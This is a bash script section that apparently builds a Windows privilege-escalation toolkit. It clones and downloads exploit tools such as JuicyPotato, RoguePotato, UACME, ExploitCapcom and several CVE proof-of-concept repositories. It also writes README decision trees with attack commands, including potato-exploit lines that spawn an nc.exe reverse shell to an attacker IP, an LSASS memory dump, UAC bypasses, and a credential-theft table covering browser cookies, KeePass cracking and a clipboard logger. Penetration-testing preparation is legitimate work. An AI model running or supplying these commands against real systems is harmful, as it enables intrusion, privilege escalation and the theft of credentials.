...
# =============================================================================
section "8b — WINDOWS PRIVESC PoC SUBFOLDERS"
# Organized by privilege type with READMEs and decision trees
# =============================================================================
...
# ── Helper: download to subdir AND windows/ root ──────────────────────────────
dl_priv() {
...
# ── Helper: copy from windows/ root to subdir ─────────────────────────────────
cp_priv() {
    local filename="$1" subdir="$2"
    [[ -f "$WIN/$filename" ]] && cp "$WIN/$filename" "$subdir/$filename"
    [[ -d "$WIN/$filename" ]] && cp -r "$WIN/$filename" "$subdir/$filename"
}

# ── SeImpersonatePrivilege ────────────────────────────────────────────────────
cat > "$PRIV/SeImpersonatePrivilege/README.md" << 'RMEOF'
# SeImpersonatePrivilege
...
## Decision tree
- Server 2019 / Win10  → PrintSpoofer or RoguePotato
- Server ≤ 2016        → JuicyPotato (need valid CLSID for OS version)
...
### JuicyPotato
```cmd
JuicyPotato.exe -l 53375 -p cmd.exe -a "/c nc.exe <IP> <PORT> -e cmd.exe" -t *
```
### RoguePotato
```cmd
RoguePotato.exe -r <REMOTE_IP> -e "nc.exe <IP> <PORT> -e cmd.exe" -l 9999
# Kali: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999
```
RMEOF
...
[[ -n "$JUICY_URL" ]] && dl_priv "$JUICY_URL" "$PRIV/SeImpersonatePrivilege" "JuicyPotato.exe" \
    && log "JuicyPotato.exe"
...
[[ -n "$PS_URL" ]] && dl_priv "$PS_URL" "$PRIV/SeImpersonatePrivilege" "PrintSpoofer.exe" \
    && log "PrintSpoofer.exe"
...
[[ -n "$RP_URL" ]] && dl_priv "$RP_URL" "$PRIV/SeImpersonatePrivilege" "RoguePotato.exe" \
    && log "RoguePotato.exe"

# ── SeDebugPrivilege ──────────────────────────────────────────────────────────
cat > "$PRIV/SeDebugPrivilege/README.md" << 'RMEOF'
# SeDebugPrivilege

## When to use
`whoami /priv` shows SeDebugPrivilege

## Techniques
### psgetsys — spawn SYSTEM shell via parent process injection
```powershell
Import-Module .\psgetsys.ps1
ImpersonateFromParentPid -ppid <SYSTEM_PID> -command "cmd.exe" -cmdargs ""
```
### LSASS dump
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Parse on Kali: pypykatz lsa minidump lsass.dmp
```
RMEOF

curl -fsSL "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" \
    -o "$PRIV/SeDebugPrivilege/psgetsys.ps1" && \
    cp "$PRIV/SeDebugPrivilege/psgetsys.ps1" "$WIN/psgetsys.ps1" && log "psgetsys.ps1"

# ── SeTakeOwnershipPrivilege ──────────────────────────────────────────────────
cat > "$PRIV/SeTakeOwnershipPrivilege/README.md" << 'RMEOF'
# SeTakeOwnershipPrivilege
...
## Steps
1. Enable: `Import-Module .\EnableAllTokenPrivs.ps1`
2. Take ownership: `takeown /f C:\path\to\file`
3. Grant access: `icacls C:\path\to\file /grant <user>:F`
...
log "EnableAllTokenPrivs.ps1"

# ── SeBackupPrivilege ─────────────────────────────────────────────────────────
cat > "$PRIV/SeBackupPrivilege/README.md" << 'RMEOF'
# SeBackupPrivilege

## When to use
`whoami /priv` shows SeBackupPrivilege — common for Backup Operators
...
[[ ! -d "$PRIV/SeBackupPrivilege/repo/.git" ]] && \
    git clone -q --depth=1 https://github.com/giuliano108/SeBackupPrivilege \
        "$PRIV/SeBackupPrivilege/repo"
find "$PRIV/SeBackupPrivilege/repo" -name "*.dll" | while read dll; do
    fname=$(basename "$dll")
...
cat > "$PRIV/SeLoadDriverPrivilege/README.md" << 'RMEOF'
# SeLoadDriverPrivilege

## When to use
Member of Print Operators, or `whoami /priv` shows SeLoadDriverPrivilege

## Steps
1. Compile EnableSeLoadDriverPrivilege.cpp in Visual Studio
2. Load Capcom.sys: `EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Capcom.sys`
3. Get SYSTEM: `ExploitCapcom.exe`
...
[[ ! -d "$PRIV/SeLoadDriverPrivilege/ExploitCapcom/.git" ]] && \
    git clone -q --depth=1 https://github.com/tandasat/ExploitCapcom \
        "$PRIV/SeLoadDriverPrivilege/ExploitCapcom" && log "ExploitCapcom/"

# ── KernelExploits ────────────────────────────────────────────────────────────
cat > "$PRIV/KernelExploits/README.md" << 'RMEOF'
# Kernel / OS Exploits

## Identification
Run Watson.exe → WES-NG → check specific CVEs below

| CVE | Affected | Check |
|---|---|---|
| CVE-2021-36934 HiveNightmare | Win10 21H1 and earlier | `icacls C:\Windows\System32\config\SAM` shows BUILTIN\Users RX |
| CVE-2021-1675 PrintNightmare | All Windows w/ spooler | `ls \\localhost\pipe\spoolss` exists |
| CVE-2020-0668 | Build ≤ 18363 | Service Tracing arbitrary file write |
| MS16-032 | Win7/Server 2008 R2 SP1 missing KB3143141 | Secondary Logon Service |
| CVE-2019-1388 hhupd | GUI access, unpatched | UAC bypass via cert dialog |
RMEOF

cp_priv "HiveNightmare" "$PRIV/KernelExploits"
cp_priv "HiveNightmare.exe" "$PRIV/KernelExploits"
...
[[ ! -d "$PRIV/KernelExploits/CVE-2020-0668/.git" ]] && \
    git clone -q --depth=1 https://github.com/RedCursorSecurityConsulting/CVE-2020-0668 \
        "$PRIV/KernelExploits/CVE-2020-0668" && log "CVE-2020-0668/"

cp_priv "Invoke-MS16-032.ps1" "$PRIV/KernelExploits"
cp_priv "Sherlock.ps1" "$PRIV/KernelExploits"
cp_priv "Windows-Exploit-Suggester" "$PRIV/KernelExploits"

WATSON_URL=$(curl -s https://api.github.com/repos/rasta-mouse/Watson/releases/latest \
    | grep browser_download_url | grep ".exe" | head -1 | cut -d'"' -f4)
[[ -n "$WATSON_URL" ]] && dl_priv "$WATSON_URL" "$PRIV/KernelExploits" "Watson.exe" \
    && log "Watson.exe"

[[ ! -d "$PRIV/KernelExploits/wesng/.git" ]] && \
    git clone -q --depth=1 https://github.com/bitsadmin/wesng "$PRIV/KernelExploits/wesng" && \
    cp -r "$PRIV/KernelExploits/wesng" "$WIN/wesng" && log "wesng/"

[[ ! -d "$PRIV/KernelExploits/CVE-2019-1388/.git" ]] && \
    git clone -q --depth=1 https://github.com/jas502n/CVE-2019-1388 \
        "$PRIV/KernelExploits/CVE-2019-1388" && log "CVE-2019-1388 (hhupd)"

# ── UACBypass ─────────────────────────────────────────────────────────────────
cat > "$PRIV/UACBypass/README.md" << 'RMEOF'
# UAC Bypass

## When to use
Have local admin creds but UAC blocking elevation

## Tools
### UACME — pick method by Windows build number
```cmd
[environment]::OSVersion.Version  # get build
Akagi64.exe <method_number> cmd.exe
```
### Bypass-UAC.ps1
```powershell
...
[[ ! -d "$PRIV/UACBypass/UACME/.git" ]] && \
    git clone -q --depth=1 https://github.com/hfiref0x/UACME \
        "$PRIV/UACBypass/UACME" && log "UACME/"
cp_priv "Bypass-UAC.ps1" "$PRIV/UACBypass"

# ── ServiceMisconfig ──────────────────────────────────────────────────────────
cat > "$PRIV/ServiceMisconfig/README.md" << 'RMEOF'
# Service Misconfiguration

## Workflow
1. PowerUp.ps1 or SharpUp.exe — automated discovery
2. accesschk.exe — manually verify permissions on leads
3. Exploit: weak ACL, unquoted path, AlwaysInstallElevated

## Commands
```powershell
# PowerUp
Invoke-AllChecks
Write-UserAddMSI  # AlwaysInstallElevated
```
```cmd
# SharpUp
SharpUp.exe audit

# accesschk — EULA pre-accepted via Sysinternals_EULA.reg
reg import Sysinternals_EULA.reg
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv <ServiceName>
```
RMEOF

# Sysinternals EULA pre-accept reg file
...
log "Sysinternals_EULA.reg"

curl -fsSL "https://live.sysinternals.com/accesschk64.exe" \
    -o "$PRIV/ServiceMisconfig/accesschk.exe" && \
    cp "$PRIV/ServiceMisconfig/accesschk.exe" "$WIN/accesschk.exe" && log "accesschk.exe"

SHARPUP_URL=$(curl -s https://api.github.com/repos/GhostPack/SharpUp/releases/latest \
    | grep browser_download_url | grep ".exe" | head -1 | cut -d'"' -f4)
[[ -n "$SHARPUP_URL" ]] || SHARPUP_URL="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"
curl -fsSL "$SHARPUP_URL" -o "$PRIV/ServiceMisconfig/SharpUp.exe" && \
    cp "$PRIV/ServiceMisconfig/SharpUp.exe" "$WIN/SharpUp.exe" && log "SharpUp.exe"

cp_priv "PowerUp.ps1" "$PRIV/ServiceMisconfig"

# ── CredentialTheft ───────────────────────────────────────────────────────────
cat > "$PRIV/CredentialTheft/README.md" << 'RMEOF'
# Credential Theft

| Situation | Tool |
|---|---|
| Chrome/Chromium | SharpChrome.exe or Invoke-SharpChromium.ps1 |
| Firefox cookies | cookieextractor.py (copy cookies.sqlite first) |
| mRemoteNG confCons.xml | mremoteng_decrypt.py (default master pass: mR3m) |
| .kdbx KeePass file | keepass2john → hashcat -m 13400 |
| PuTTY/WinSCP/RDP sessions | SessionGopher.ps1 |
| User active on machine | Invoke-ClipboardLogger.ps1 |
| File share write access | Responder + Lnkbomb (Server 2019+) |
...
for f in SharpChrome.exe Invoke-SharpChromium.ps1 mremoteng_decrypt.py \
    ...
    cp_priv "$f" "$PRIV/CredentialTheft"
done

[[ ! -d "$PRIV/CredentialTheft/Lnkbomb/.git" ]] && \
    git clone -q --depth=1 https://github.com/dievus/lnkbomb \
        "$PRIV/CredentialTheft/Lnkbomb" && \
    cp -r "$PRIV/CredentialTheft/Lnkbomb" "$WIN/Lnkbomb" && log "Lnkbomb/"

# ── Enumeration ───────────────────────────────────────────────────────────────
cat > "$PRIV/Enumeration/README.md" << 'RMEOF'
# Enumeration Order
1. winPEAS — comprehensive automated scan
2. Seatbelt — deeper host recon
3. Watson — missing patches (.NET)
4. WES-NG (Kali) — feed systeminfo for CVEs
5. JAWS — legacy hosts (PowerShell 2.0)
6. Snaffler — domain share crawling
...
for f in winPEASx64.exe winPEASx86.exe winPEAS.bat Seatbelt.exe \
          SharpHound.exe SharpHound.ps1 Snaffler.exe; do
    cp_priv "$f" "$PRIV/Enumeration"
done
cp_priv "wesng" "$PRIV/Enumeration"
cp_priv "Watson.exe" "$PRIV/Enumeration"

curl -fsSL \
    "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
    -o "$PRIV/Enumeration/jaws-enum.ps1" && \
    cp "$PRIV/Enumeration/jaws-enum.ps1" "$WIN/jaws-enum.ps1" && log "jaws-enum.ps1"

# ── DSInternals ───────────────────────────────────────────────────────────────
cat > "$PRIV/DSInternals/README.md" << 'RMEOF'
# DSInternals — Offline NTDS.dit Analysis

## When to use
You have a copy of NTDS.dit from DC backup, VSS snapshot, or SeBackupPrivilege
...
if [[ -n "$DSINT_URL" ]]; then
    ...
    [[ ! -d "$PRIV/DSInternals/repo/.git" ]] && \
        git clone -q --depth=1 https://github.com/MichaelGrafnetter/DSInternals \
            "$PRIV/DSInternals/repo" && log "DSInternals/"
fi

# ── Master README ─────────────────────────────────────────────────────────────
cat > "$PRIV/README.md" << 'RMEOF'
# Windows PrivEsc PoC Scripts

| Folder | Use when |
|---|---|
| SeImpersonatePrivilege/ | whoami /priv shows SeImpersonatePrivilege |
| SeDebugPrivilege/ | whoami /priv shows SeDebugPrivilege |
| SeTakeOwnershipPrivilege/ | whoami /priv shows SeTakeOwnershipPrivilege |
| SeBackupPrivilege/ | whoami /priv shows SeBackupPrivilege / Backup Operators |
| SeLoadDriverPrivilege/ | Print Operators / SeLoadDriverPrivilege |
| KernelExploits/ | Check patch level — Watson/WES-NG first |
| UACBypass/ | Have local admin but UAC blocking elevation |
| ServiceMisconfig/ | PowerUp/SharpUp finds weak service ACL, unquoted path, AlwaysInstallElevated |
| CredentialTheft/ | Post-exploitation credential hunting |
| Enumeration/ | Initial host enumeration |
| DSInternals/ | Have copy of NTDS.dit |

## Quick Decision Reference
```
SeImpersonatePrivilege
  Server 2019/Win10   → PrintSpoofer / RoguePotato
  Server ≤ 2016       → JuicyPotato

SeDebugPrivilege      → psgetsys.ps1 (parent injection)
SeTakeOwnership       → EnableAllTokenPrivs.ps1 → takeown → icacls
SeBackupPrivilege     → SeBackupPrivilege DLLs → Copy-FileSeBackupPrivilege → NTDS.dit
SeLoadDriverPrivilege → EoPLoadDriver → Capcom.sys → ExploitCapcom

Kernel
  HiveNightmare       → icacls SAM shows BUILTIN\Users RX
  PrintNightmare      → ls \\localhost\pipe\spoolss exists
  CVE-2020-0668       → build ≤ 18363
  MS16-032            → Win7/Server 2008 R2 SP1

UAC bypass            → UACME by build number

Service misconfig     → PowerUp → SharpUp → accesschk to verify

Credentials
  Chrome              → SharpChrome.exe
  Firefox             → cookieextractor.py
  mRemoteNG           → mremoteng_decrypt.py
  KeePass .kdbx       → keepass2john → hashcat -m 13400
  Saved sessions      → SessionGopher.ps1
  Active user         → Invoke-ClipboardLogger.ps1
  Share write access  → Lnkbomb + Responder
```
RMEOF

log "Windows privesc PoC subfolders created"
# =============================================================================
